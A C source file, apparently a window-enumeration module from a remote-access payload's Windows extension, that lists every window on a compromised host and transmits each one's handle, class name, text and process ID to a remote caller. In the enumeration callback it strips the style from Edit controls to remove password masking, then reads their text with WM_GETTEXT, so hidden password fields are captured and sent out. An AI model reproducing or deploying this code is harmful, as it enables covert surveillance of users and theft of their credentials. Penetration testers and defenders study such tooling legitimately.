/*!
 * @file window.c
 * @brief Definitions for window management functionality
 */
#include "extapi.h"
#include "common_metapi.h"
#include "window.h"

VOID add_enumerated_window(Packet *pResponse, QWORD qwHandle, const wchar_t* cpWindowTitle_u, const wchar_t* cpClassName_u, DWORD dwProcessId);
DWORD enumerate_windows(Packet *response, BOOL bIncludeUnknown, QWORD parentWindow);

/*! @brief The maximum number of characters extracted from a window title. */
#define MAX_WINDOW_TITLE 256

/*! @brief EnumChildWindows function pointer type. */
typedef BOOL(WINAPI * PENUMCHILDWINDOWS)(HWND hWndParent, WNDENUMPROC enumProc, LPARAM lparam);
/*! @brief SendMessageW function pointer type. */
typedef int (WINAPI * PSENDMESSAGEW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
/*! @brief SetWindowWord function pointer type. */
typedef int (WINAPI * PSETWINDOWWORD)(HWND hWnd, int nIndex, WORD nNewWord);
/*! @brief GetClassNameW function pointer type. */
typedef int (WINAPI * PGETCLASSNAMEW)(HWND hWnd, LPWSTR lpString, int nMaxCount);
/*! @brief GetWindowThreadProcessId function pointer type. */
typedef DWORD(WINAPI * PGETWINDOWTHREADPROCESSID)(HWND hWnd, LPDWORD lpdwProcessId);

/*! @brief Container type used to maintain state across EnumChildWindows callback calls. */
typedef struct _EnumWindowsState
{
	Packet* pResponse;                                     ///< Pointer to the \c Packet to add results to.
	BOOL bIncludeUnknown;                                  ///< Flag indicating if unknown windows should be included.
	PSENDMESSAGEW pSendMessageW;                        ///< Pointer to the SendMessageW function.
	PGETCLASSNAMEW pGetClassNameW;                        ///< Pointer to the GetClassNameW function.
	PSETWINDOWWORD pSetWindowWord;                        ///< Pointer to the SetWindowWord function.
	PGETWINDOWTHREADPROCESSID pGetWindowThreadProcessId;   ///< Pointer to the GetWindowThreadProcessId function.
} EnumWindowsState;

/*!
 * @brief Callback used during enumeration of desktop Windows.
 * @hWnd Handle to the Window that was enumerated.
 * @hWnd lParam State value passed in during enumeration.
 * @returns Indication of whether to continue enumeration.
 *          This function always returns \c TRUE.
 */
BOOL CALLBACK enumerate_windows_callback(HWND hWnd, LPARAM lParam)
{
	wchar_t windowTitle_u[MAX_WINDOW_TITLE];
	wchar_t className_u[MAX_WINDOW_TITLE];
	DWORD dwThreadId = 0;
	DWORD dwProcessId = 0;
	EnumWindowsState* pState = (EnumWindowsState*)lParam;

	dprintf("[EXTAPI WINDOW] Enumerated window %x", hWnd);

	do
	{
		dprintf("[EXTAPI WINDOW] Getting class name %p", pState->pGetClassNameW);
		if (pState->pGetClassNameW(hWnd, className_u, MAX_WINDOW_TITLE) == 0)
		{
			dprintf("[EXTAPI WINDOW] Unable to get class name. Setting to <unknown>.");
			if (pState->bIncludeUnknown)
			{
				wcsncpy_s(className_u, MAX_WINDOW_TITLE, L"<unknown>", MAX_WINDOW_TITLE - 1);
			}
			else
			{
				break;
			}
		}

		dprintf("[EXTAPI WINDOW] Getting class name %p", pState->pSetWindowWord);
		if (wcscmp(className_u, L"Edit") == 0)
		{
			dprintf("[EXTAPI WINDOW] Remove ES_PASSWORD style.");
			pState->pSetWindowWord(hWnd, GWL_STYLE, 0);
		}

		dprintf("[EXTAPI WINDOW] Getting window title %p", pState->pSendMessageW);
		if (pState->pSendMessageW(hWnd, WM_GETTEXT, MAX_WINDOW_TITLE, (LPARAM)windowTitle_u) == 0)
		{
			dprintf("[EXTAPI WINDOW] Unable to get window title. Setting to <unknown>.");
			if (pState->bIncludeUnknown)
			{
				wcsncpy_s(windowTitle_u, MAX_WINDOW_TITLE, L"<unknown>", MAX_WINDOW_TITLE - 1);
			}
			else
			{
				break;
			}
		}

		dprintf("[EXTAPI WINDOW] Getting process ID %p", pState->pGetWindowThreadProcessId);
		dwThreadId = pState->pGetWindowThreadProcessId(hWnd, &dwProcessId);

		dprintf("[EXTAPI WINDOW] Adding enumerated response");
		add_enumerated_window(pState->pResponse, (QWORD)hWnd, windowTitle_u, className_u, dwProcessId);
	} while (0);

	return TRUE;
}

/*!
 * @brief Perform enumeration of windows.
 * @param response Pointer to the \c Packet which will contain the response.
 * @param bIncludeUnknown Set to \c TRUE if unknown windows are to be included.
 * @param parentWindow Handle to the parent window to use for enumeration.
 *        Set this value to \c NULL to enumerate top-level windows.
 * @returns Indication success or failure.
 */
DWORD enumerate_windows(Packet *response, BOOL bIncludeUnknown, QWORD parentWindow)
{
	DWORD dwResult;
	HMODULE hUser32 = NULL;
	PENUMCHILDWINDOWS pEnumChildWindows;
	EnumWindowsState state;

	do
	{
		dprintf("[EXTAPI WINDOW] Loading user32.dll");
		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to load user32.dll");
		}

		dprintf("[EXTAPI WINDOW] Searching for SendMessageW");
		if ((state.pSendMessageW = (PSENDMESSAGEW)GetProcAddress(hUser32, "SendMessageW")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate SendMessageW in user32.dll");
		}
		dprintf("[EXTAPI WINDOW] Found SendMessageW %p", state.pSendMessageW);

		dprintf("[EXTAPI WINDOW] Searching for GetClassNameW");
		if ((state.pGetClassNameW = (PGETCLASSNAMEW)GetProcAddress(hUser32, "GetClassNameW")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate GetClassNameW in user32.dll");
		}
		dprintf("[EXTAPI WINDOW] Found GetClassNameW %p", state.pGetClassNameW);

		dprintf("[EXTAPI WINDOW] Searching for SetWindowWord");
		if ((state.pSetWindowWord = (PSETWINDOWWORD)GetProcAddress(hUser32, "SetWindowWord")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate SetWindowWord in user32.dll");
		}
		dprintf("[EXTAPI WINDOW] Found SetWindowWord %p", state.pSetWindowWord);

		dprintf("[EXTAPI WINDOW] Searching for GetWindowThreadProcessId");
		if ((state.pGetWindowThreadProcessId = (PGETWINDOWTHREADPROCESSID)GetProcAddress(hUser32, "GetWindowThreadProcessId")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate GetWindowThreadProcessId in user32.dll");
		}

		dprintf("[EXTAPI WINDOW] Found GetWindowThreadProcessId %p", state.pGetWindowThreadProcessId);

		state.pResponse = response;
		state.bIncludeUnknown = bIncludeUnknown;

		dprintf("[EXTAPI WINDOW] Searching for EnumChildWindows");
		if ((pEnumChildWindows = (PENUMCHILDWINDOWS)GetProcAddress(hUser32, "EnumChildWindows")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate EnumChildWindows in user32.dll");
		}

		dprintf("[EXTAPI WINDOW] Beginning enumeration of child windows with parent %u", parentWindow);
		if (!pEnumChildWindows(parentWindow != 0 ? (HWND)parentWindow : NULL, (WNDENUMPROC)enumerate_windows_callback, (LPARAM)&state))
		{
			BREAK_ON_ERROR("[EXTAPI WINDOW] Failed to enumerate child windows");
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	if (hUser32)
	{
		FreeLibrary(hUser32);
	}

	return dwResult;
}

/*!
 * @brief Handle the request for window enumeration.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_window_enum(Remote *remote, Packet *packet)
{
	QWORD parentWindow = 0;
	DWORD dwResult = ERROR_SUCCESS;
	BOOL bIncludeUnknown = FALSE;
	Packet * response = met_api->packet.create_response(packet);

	do
	{
		if (!response)
		{
			dprintf("[EXTAPI WINDOW] Unable to create response packet");
			dwResult = ERROR_OUTOFMEMORY;
			break;
		}

		// Extract the specified parent window. If this is NULL, that's ok, as we'll
		// just enumerate top-level windows.
		parentWindow = met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_EXT_WINDOW_ENUM_HANDLE);

		// Extract the flag that indicates of unknown windows should be included in the output
		bIncludeUnknown = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_EXT_WINDOW_ENUM_INCLUDEUNKNOWN);

		dprintf("[EXTAPI WINDOW] Beginning window enumeration");
		dwResult = enumerate_windows(response, bIncludeUnknown, parentWindow);

	} while (0);

	dprintf("[EXTAPI WINDOW] Transmitting response back to caller.");
	if (response)
	{
		met_api->packet.transmit_response(dwResult, remote, response);
	}

	return dwResult;
}

/*!
 * @brief Add an enumerated window to the response.
 * @param pResponse Pointer to the \c Response to add the window detail to.
 * @param qwHandle Handle to the window that was found/enumerated/
 * @param cpWindowTitle Title of the window.
 * @param cpClassName ClassName of the window.
 * @param dwProcessId ID of the process that the Window belongs to.
 */
VOID add_enumerated_window(Packet *pResponse, QWORD qwHandle, const wchar_t* cpWindowTitle, const wchar_t* cpClassName, DWORD dwProcessId)
{
	Packet* pGroup = met_api->packet.create_group();

	met_api->packet.add_tlv_uint(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_PID, dwProcessId);
	met_api->packet.add_tlv_qword(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_HANDLE, qwHandle);
	met_api->packet.add_tlv_string(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_TITLE, met_api->string.wchar_to_utf8(cpWindowTitle));
	met_api->packet.add_tlv_string(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_CLASSNAME, met_api->string.wchar_to_utf8(cpClassName));
	met_api->packet.add_group(pResponse, TLV_TYPE_EXT_WINDOW_ENUM_GROUP, pGroup);
}
